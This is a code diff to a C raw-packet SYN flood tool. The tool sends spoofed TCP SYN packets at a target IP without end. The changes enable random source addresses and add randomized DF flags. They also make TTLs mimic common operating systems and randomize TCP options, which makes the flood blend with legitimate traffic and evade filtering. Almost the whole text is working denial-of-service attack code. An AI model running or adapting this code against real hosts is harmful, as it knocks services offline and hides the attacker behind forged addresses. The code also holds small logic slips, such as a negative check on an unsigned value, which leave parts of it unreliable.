@@ -23,13 +23,14 @@ License: MIT
 
 #define DEBUG 0 // Set verbosity
 #define DELAY 0 // Set delay between packets in seconds
-#define RAND_SRC_ADDR 0 // Toggle source address randomization
+#define RAND_SRC_ADDR 1 // Toggle source address randomization
 #define RAND_SRC_PORT 1 // Toggle source port randomization
 #define RAND_ID 1 // Toggle IP ID randomization
+#define RAND_DF 1 // Toggle IP DF flag randomization
 #define RAND_SEQ 1 // Toggle TCP Sequence Number randomization
 #define RAND_WINDOW 1 // Toggle Window Size randomization
 #define RAND_TTL 1 // Toggle TTL randomization
-#define RAND_TTL_MIN 55
+#define RAND_TTL_MIN 1
 #define RAND_TTL_MAX 63
 
 #define PROTO_TCP_OPT_NOP   1
@@ -60,6 +61,10 @@ const uint16_t default_src_port = 9000;
 
 // Destination Port, unless otherwise specified with argv[2]
 const uint16_t default_dst_port = 80;
+
+const uint8_t default_ttl_list[3] = {64, 128, 255}; 
+const uint8_t n_default_ttls = 3;
+const uint8_t ttl_subtract_max = 5;
 
 volatile int busy_wait_var;
 
@@ -203,20 +208,11 @@ int main(int argc, char *argv[]) {
 
 	// Get target (and optionally source) IP address
 	char dst_addr[32];
-	strcpy(dst_addr, default_dst_addr);
-	char src_addr[32];
-	strcpy(src_addr, default_src_addr);
-	uint16_t dst_port = default_dst_port;
-	uint16_t busywait = 0;
+	uint16_t dst_port;
+	uint32_t busy_wait;
 
 	if (argc > 1) {
 		strcpy(dst_addr, argv[1]);
-		if (argc > 2) {
-			busywait = atoi(argv[2]);
-			if (argc > 3) {
-				strcpy(src_addr, argv[3]);
-			}
-		}
 	} else {
     printf("Please specify a target IP address, and optionally a port number (default destination port is 80).\nExample usage: syn_flood 127.0.0.1 80\n");
 		exit(1);
@@ -228,11 +224,15 @@ int main(int argc, char *argv[]) {
 	// 	dst_port = default_dst_port;
 	// }
 
-	
+	if (argc > 2) {
+		busy_wait = (uint32_t)atoi(argv[2]);
+	} else {
+		busy_wait = 0;
+	}
 
-	if (busywait < 0) {
+	if (busy_wait < 0) {
 		#if DEBUG
-			printf("Received negative value for busywait parameter %u, exiting.\n", busywait);
+			printf("Received negative value for busywait parameter %u, exiting.\n", busy_wait);
 		#endif
 		return 1;
 	}
@@ -244,7 +244,7 @@ int main(int argc, char *argv[]) {
 		#if RAND_SRC_ADDR
 			printf("Randomizing source address\n");
 		#else
-			printf("Using source address %s\n", src_addr);
+			printf("Using source address %s\n", default_src_addr);
 		#endif
 
 		#if RAND_SRC_PORT
@@ -297,7 +297,7 @@ int main(int argc, char *argv[]) {
 	iph->ttl = 64;
 	iph->protocol = IPPROTO_TCP;
 	iph->check = 0;		//Set to 0 before calculating checksum
-	iph->saddr = inet_addr(src_addr);
+	iph->saddr = inet_addr(default_src_addr);
 	iph->daddr = sin.sin_addr.s_addr;
 
 	// TCP Header
@@ -345,7 +345,7 @@ int main(int argc, char *argv[]) {
 	// Generate packets forever, the caller must terminate this program manually
 	while(1) {
 		struct iphdr *iph = (struct iphdr *)datagram;
-        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+	        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 		// Generate a new random source IP, excluding certain prefixes
 		// new_saddr = (__be32)(random_ipv4());
 		#if RAND_SRC_ADDR
@@ -356,13 +356,21 @@ int main(int argc, char *argv[]) {
 			iph->id = rand_next() & 0xffff;
 		#endif
 
+		#if RAND_DF 
+			if (rand_next() % 2 == 0) {
+				iph->frag_off = htons(1 <<14);
+			} else {
+				iph->frag_off = 0;
+			}
+		#endif
+
 		#if RAND_WINDOW
 			tcph->window = rand_next() & 0xffff;
 		#endif
 
 		#if RAND_SRC_PORT
 			tcph->source = rand_next() & 0xffff;
-			tcph->dest =htons(80);
+			tcph->dest = htons(80);
 			sin.sin_port = tcph->dest;
 		#endif
 
@@ -371,8 +379,41 @@ int main(int argc, char *argv[]) {
 		#endif
 
 		#if RAND_TTL
-			iph->ttl = rand_next() % (RAND_TTL_MAX + 1 - RAND_TTL_MIN) + RAND_TTL_MIN;
+			// iph->ttl = rand_next() % (RAND_TTL_MAX + 1 - RAND_TTL_MIN) + RAND_TTL_MIN;
+			iph->ttl = (uint8_t) (default_ttl_list[rand_next() % n_default_ttls] - ((rand_next() % (ttl_subtract_max - 1)) + 1));
 		#endif
+
+		iph->id = rand_next() & 0xffff;
+		tcph->ack_seq = rand_next() & 0xffff;
+
+		uint8_t *opts = (uint8_t *)(tcph + 1);
+
+		// TCP MSS
+	        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
+	        *opts++ = 4;                    // Length
+	        *((uint16_t *)opts) = rand_next() & 0xffff;//htons(1400 + (rand_next() & 0x0f));
+	        opts += sizeof (uint16_t);
+
+	        // TCP SACK permitted
+	        *opts++ = PROTO_TCP_OPT_SACK;
+	        *opts++ = 2;
+
+	        // TCP timestamps
+	        *opts++ = PROTO_TCP_OPT_TSVAL;
+	        *opts++ = 10;
+	        *((uint32_t *)opts) = rand_next();
+	        opts += sizeof (uint32_t);
+	        *((uint32_t *)opts) = rand_next();
+	        opts += sizeof (uint32_t);
+
+        	// TCP nop
+	        *opts++ = 1;
+
+        	// TCP window scale
+	        *opts++ = PROTO_TCP_OPT_WSS;
+	        *opts++ = 3;
+	        //*opts++ = 6; // 2^6 = 64, window size scale = 64
+		*((uint8_t*)opts) = rand_next() & 0xff;
 
 		iph->check = 0;
 		iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
@@ -392,9 +433,8 @@ int main(int argc, char *argv[]) {
 			sleep(DELAY);
 		#endif
 
-		if (busywait > 0) {
-			busy_wait_var = 0;
-			for (int i=0; i<busywait; i++) {
+		if (busy_wait) {
+			for (int i=0; i<busy_wait; i++) {
 				busy_wait_var += 1;
 			}
 		}
